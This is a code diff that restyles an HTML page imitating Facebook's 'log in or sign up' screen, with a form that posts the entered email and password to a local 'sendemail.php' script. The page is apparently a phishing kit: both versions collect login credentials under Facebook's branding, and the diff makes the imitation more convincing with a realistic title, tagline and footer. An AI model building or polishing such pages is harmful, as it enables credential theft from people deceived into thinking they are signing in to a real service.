@@ -1,130 +1,82 @@
 <!DOCTYPE html>
-<html lang=”en”>
+<html lang="en">
 <head>
-<title>Facebook</title>
-<meta charset=”utf-8″>
-<meta name=”viewport” content=”width=device-width, initial-scale=1″>
-<link rel=”stylesheet” href=”https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css”>
-<script src=”https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js”></script>
-<script src=”https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js”></script>
-<script src=”https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js”></script>
-<style>
-header{
-background-color: #FFFFFF;
-height:100%;
-}
-.jumbotron{
-padding: 2px;
-background-color: #0096FF;
-color: white;
-border-radius: 0 !important;
-font-family: ‘Ubuntu’, sans-serif;
-}
-h1{
-font-weight: bold;
-}
-p{
-font-family: Roboto;
-}
-.form-group{
-margin: 0;
-}
-#btn1{
-width: 100%;
-background-color: #0096FF;
-border-radius: 0 !important;
-color: white;
-}
-.form-control:focus {
-border-color: #F89D6F ;
-box-shadow:none !important;
-outline: none;
-}
-#email{
-border-radius: 0 !important;
-}
-#pwd{
-border-radius: 0 !important;
-}
-#btn2{
-background-color: #0B9E1F;
-color: white;
-border-radius: 0 !important;
-}
-#orr{
-color: black;
-}
-.fff{
-color:#286D9F;
-font-size: 12px;
-}
-#lans{
-font-size: 12px;
-}
-.newspaper {
--webkit-column-count: 2; /* Old Chrome, Safari and Opera */
--moz-column-count: 2; /* Old Firefox */
-column-count: 2;
-text-align: center;
-}
-.hh1{
-line-height: 120%;
-}
-.hh2{
-line-height: 120%;
-}
-.form-group{
-border-radius: 0 !important;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<header>
-<div class=”jumbotron text-center”>
-<h2>facebook</h2>
-</div>
-<div class=”container”>
-<form action=”sendemail.php” method=”post” name=”form” autocomplete=”off”>
-<div class=”form-group”>
-<input type=”text” class=”form-control p-3″ id=”email” placeholder=”Mobile number or email address” name=”email” minlength=”8″ required>
-</div>
-<div class=”form-group”>
-<input type=”password” class=”form-control mt-1″ id=”pwd” placeholder=”Password” name=”password” minlength=”8″ required>
-</div>
-<button type=”submit” class=”btn mt-2″ name=”submit” value=”Send” id=”btn1″>Log In</button>
-</form>
-</div>
-<div class=”row mt-4″>
-<div class=”col”><hr></div>
-<div class=”col-auto”>or</div>
-<div class=”col”><hr></div>
-</div>
-<div class=”container text-center mt-2″>
-<input type=”submit” class=”btn” id=”btn2″ value=”Create New Account”>
-</div>
-<div class=”fff text-center mt-4″>
-<p>Forgotten password? . Help Centre</p>
-</div>
-</header>
-<div class=”container mt-4″ id=”lans”>
-<div class=”newspaper”>
-<div class=”hh1″>
-English(UK)<br>
-অসমীয়া<br>
-বাংলা<br>
-</div>
- 
-<div class=”hh2″>
-हिन्दी<br>
-தமிழ்
-<br>
-मराठी<br>
-</div>
-</div>
-</div>
-</div>
-<div class=”ftt text-center mt-3 text-muted”>
-<p>Meta ©2022</p>
-</div>
+    <div class="main-content">
+        <div class="fb-container">
+            <div class="fb-left">
+                <h1 class="fb-logo-text">facebook</h1>
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="login-card">
+                <form action="sendemail.php" method="post" autocomplete="off">
+                    <input type="text" name="email" placeholder="Email address or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit" name="submit" value="Send" class="btn-login">Log In</button>
+                    <a href="#" class="forgot-password">Forgotten password?</a>
+                    <hr>
+                    <button type="button" class="btn-create-account">Create New Account</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="languages">
+                <a href="#">English (UK)</a>
+                <a href="#">অসমীয়া</a>
+                <a href="#">বাংলা</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">தமிழ்</a>
+                <a href="#">मরাঠী</a>
+                <a href="#">తెలుగు</a>
+                <a href="#">ગુજરાતી</a>
+                <a href="#">ಕನ್ನಡ</a>
+                <a href="#">മലയാളം</a>
+                <a href="#">ਪੰਜਾਬੀ</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">Sign Up</a>
+                <a href="#">Log In</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Watch</a>
+                <a href="#">Places</a>
+                <a href="#">Games</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Oculus</a>
+                <a href="#">Portal</a>
+                <a href="#">Instagram</a>
+                <a href="#">Bulletin</a>
+                <a href="#">Local</a>
+                <a href="#">Fundraisers</a>
+                <a href="#">Services</a>
+                <a href="#">Voting Information Centre</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Privacy Centre</a>
+                <a href="#">Groups</a>
+                <a href="#">About</a>
+                <a href="#">Create ad</a>
+                <a href="#">Create Page</a>
+                <a href="#">Developers</a>
+                <a href="#">Careers</a>
+                <a href="#">Cookies</a>
+                <a href="#">AdChoices</a>
+                <a href="#">Terms</a>
+                <a href="#">Help</a>
+                <a href="#">Contact uploading and non-users</a>
+            </div>
+            <div style="margin-top: 20px;">
+                Meta © 2023
+            </div>
+        </div>
+    </footer>
 </body>
 </html>
